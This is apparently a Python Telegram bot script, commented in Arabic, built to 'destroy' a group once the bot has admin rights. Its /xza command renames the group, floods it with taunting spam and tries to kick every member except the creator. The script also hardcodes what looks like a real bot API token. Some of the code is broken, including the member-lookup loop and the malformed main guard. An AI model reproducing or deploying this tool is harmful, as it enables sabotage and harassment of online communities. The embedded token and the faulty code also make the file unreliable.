
import telebot
from telebot import types
import time
import threading

# إعدادات البوت
API_TOKEN = '8367901434:AAGV8OXzNRYoIu8F8mWgFiae9zbluFFY9NA'
bot = telebot.TeleBot(API_TOKEN)

# قائمة الرسائل المزعجة
SPAM_MESSAGES = [
    "XZA IS HERE HHHHHHHHHHHHHHHHHHHHHHHHH",
    "🔥🔥🔥 GROUP DESTROYED BY XZA 🔥🔥🔥",
    "💀 ALL MEMBERS WILL BE KICKED 💀",
    "🚨 SYSTEM FAILURE IN PROGRESS 🚨",
    "⚡ XZA POWER ACTIVATED ⚡",
    "😈 SAY GOODBYE TO YOUR GROUP 😈"
]

# وظيفة إرسال الرسائل المزعجة
def spam_messages(chat_id, duration=30):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            for msg in SPAM_MESSAGES:
                bot.send_message(chat_id, msg)
                time.sleep(0.5)
        except:
            pass

# أمر البدء /xza
@bot.message_handler(commands=['xza'])
def start_ban_all(message):
    chat_id = message.chat.id

    try:
        # تغيير اسم المجموعة
        bot.set_chat_title(chat_id, "XZA IS HERE HHHHHHHHHHHHHHHHHHHHHHHHH")

        # بدء إرسال الرسائل المزعجة في خيط منفصل
        spam_thread = threading.Thread(target=spam_messages, args=(chat_id, 60))
        spam_thread.start()

        # الحصول على قائمة الأعضاء
        members_count = bot.get_chat_members_count(chat_id)
        bot.send_message(chat_id, f"🚀 بدء عملية تدمير المجموعة... عدد الأعضاء: {members_count}")

        # عملية الطرد الجماعي مع إرسال رسائل بعد كل طرد
        kicked_count = 0
        for i in range(members_count):
            try:
                member = bot.get_chat_member(chat_id, i)

                if not member.user.is_bot and member.status != 'creator':
                    bot.kick_chat_member(chat_id, member.user.id)
                    kicked_count += 1

                    # إرسال رسالة بعد كل طرد
                    if kicked_count % 1000 == 0:
                        bot.send_message(chat_id, 
                            f"✅ تم طرد {kicked_count} عضو حتى الآن... XZA POWER")

                    time.sleep(0.2)

            except Exception as e:
                continue

        # رسالة النهاية النهائية
        final_msg = f"""🚨 PROCESS COMPLETED SUCCESSFULLY 🚨

✅ Total Members Kicked: {kicked_count}
🔥 Group Successfully Destroyed
💀 XZA POWER IS UNSTOPPABLE

HHHHHHHHHHHHHHHHHHHHHHHHH"""

        bot.send_message(chat_id, final_msg)

    except Exception as e:
        bot.send_message(chat_id, f"❌ Error: {str(e)}")

# تشغيل البوت
if name == 'main':
    bot.polling(none_stop=True)